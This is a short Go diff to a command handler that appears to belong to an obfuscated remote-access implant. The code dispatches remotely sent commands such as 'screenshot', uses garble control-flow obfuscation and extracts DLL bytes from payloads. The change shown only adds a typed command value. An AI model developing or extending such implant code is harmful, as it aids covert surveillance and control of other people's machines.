@@ -587,7 +587,8 @@ func extractCaptureDLLBytes(payload map[string]interface{}) []byte {
 func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	cmdID, _ := envelope["id"].(string)
-	action, _ := envelope["commandType"].(string)
+	actionValue, _ := envelope["commandType"].(string)
+	action := wire.CommandType(actionValue)
 
 	switch action {
 	case "screenshot":
